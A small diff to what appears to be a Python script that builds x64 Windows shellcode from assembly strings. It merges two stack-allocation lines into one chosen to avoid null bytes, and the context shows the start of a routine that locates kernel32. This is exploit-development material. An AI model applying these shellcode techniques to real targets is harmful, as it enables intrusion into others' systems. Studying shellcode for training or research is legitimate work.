@@ -15,8 +15,7 @@ def main():
         " start:                            "
         #"   int3                            ;"
         "   mov rbp, rsp                    ;"  # Save current rsp
-        "   sub rsp, 0x100                  ;"  # Allocate stack space for storing pointers
-        "   add rsp, 0xfffffffffffffdf8     ;"  # Avoid null byte
+        "   add rsp, 0xfffffffffffffdf8     ;"  # Allocate stack, and avoid null byte
         
         " find_kernel32:                    "   # start to find kernel32 library
         "   xor rcx, rcx                    ;"  # Zero RCX contents
